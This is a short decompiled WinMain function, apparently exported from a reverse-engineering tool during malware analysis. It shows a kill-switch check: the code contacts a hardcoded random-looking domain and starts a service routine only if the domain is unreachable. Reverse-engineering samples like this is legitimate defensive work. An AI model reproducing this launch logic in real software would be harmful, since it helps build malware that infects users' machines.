// --- Metadata ---
// Function Name: _WinMain@16
// Address: 0x408140
// Exported At: 20250527_193105
// Signature: unknown_signature
// ---------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  void *v4; // esi
  void *v5; // edi
  CHAR szUrl[57]; // [esp+8h] [ebp-50h] BYREF
  int v8; // [esp+41h] [ebp-17h]
  int v9; // [esp+45h] [ebp-13h]
  int v10; // [esp+49h] [ebp-Fh]
  int v11; // [esp+4Dh] [ebp-Bh]
  int v12; // [esp+51h] [ebp-7h]
  __int16 v13; // [esp+55h] [ebp-3h]
  char v14; // [esp+57h] [ebp-1h]

  strcpy(szUrl, "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com");// 킬 스위치  
  v8 = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  v13 = 0;
  v14 = 0;
  v4 = InternetOpenA(0, 1u, 0, 0, 0);
  v5 = InternetOpenUrlA(v4, szUrl, 0, 0, 0x84000000, 0);
  InternetCloseHandle(v4);
  if ( v5 )
  {
    InternetCloseHandle(v5);
  }
  else
  {
    InternetCloseHandle(0);
    StartServiceDispatcher_408090();
  }
  return 0;
}
